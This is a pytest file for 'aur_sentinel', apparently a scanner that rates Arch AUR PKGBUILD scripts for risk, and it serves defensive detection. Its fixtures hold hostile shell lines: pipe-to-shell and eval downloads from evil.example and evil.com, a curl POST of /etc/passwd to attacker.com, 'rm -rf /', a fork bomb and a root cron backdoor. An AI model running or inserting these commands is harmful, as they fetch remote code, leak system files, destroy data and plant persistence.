from aur_sentinel import RiskLevel, analyze_pkgbuild


def test_clean_pkgbuild_has_no_findings() -> None:
    # Given
    pkgbuild = "source=('https://example.org/app.tar.gz')\npackage() { install -Dm755 app; }"

    # When
    report = analyze_pkgbuild(pkgbuild)

    # Then
    assert report.score == 0
    assert report.risk is RiskLevel.CLEAN
    assert report.findings == ()


def test_pipe_to_shell_is_critical() -> None:
    # Given
    pkgbuild = "prepare() { curl -fsSL https://evil.example/payload | bash; }"

    # When
    report = analyze_pkgbuild(pkgbuild)

    # Then
    assert report.risk is RiskLevel.CRITICAL
    assert report.score >= 80
    assert report.findings[0].rule_id == "network.pipe-to-shell"


def test_multiple_threats_accumulate_without_exceeding_one_hundred() -> None:
    # Given
    pkgbuild = "prepare() { echo ZWNobyBoYWNrZWQ= | base64 -d | sh; rm -rf /; }"

    # When
    report = analyze_pkgbuild(pkgbuild)

    # Then
    assert report.score == 100
    assert len(report.findings) >= 2


def test_sudo_usage_is_detected() -> None:
    pkgbuild = "package() { sudo make install; }"
    report = analyze_pkgbuild(pkgbuild)
    assert any(f.rule_id == "privilege.sudo-usage" for f in report.findings)
    assert report.risk in (RiskLevel.HIGH, RiskLevel.CRITICAL)


def test_eval_hidden_execution_is_detected() -> None:
    pkgbuild = 'prepare() { eval "$(curl -s https://evil.com/setup)"; }'
    report = analyze_pkgbuild(pkgbuild)
    assert any(f.rule_id == "execution.hidden-eval" for f in report.findings)


def test_network_post_exfiltration_is_detected() -> None:
    pkgbuild = "prepare() { curl -X POST -d @/etc/passwd https://attacker.com/leak; }"
    report = analyze_pkgbuild(pkgbuild)
    assert any(f.rule_id == "exfiltration.network-post" for f in report.findings)


def test_fork_bomb_is_critical() -> None:
    pkgbuild = "build() { :(){ :|:& };:; }"
    report = analyze_pkgbuild(pkgbuild)
    assert any(f.rule_id == "destruction.fork-bomb" for f in report.findings)
    assert report.risk is RiskLevel.CRITICAL
    assert report.score == 100


def test_cron_modification_is_detected() -> None:
    pkgbuild = 'package() { echo "* * * * * root /tmp/backdoor" > /etc/cron.d/job; }'
    report = analyze_pkgbuild(pkgbuild)
    assert any(f.rule_id == "persistence.cron-modification" for f in report.findings)
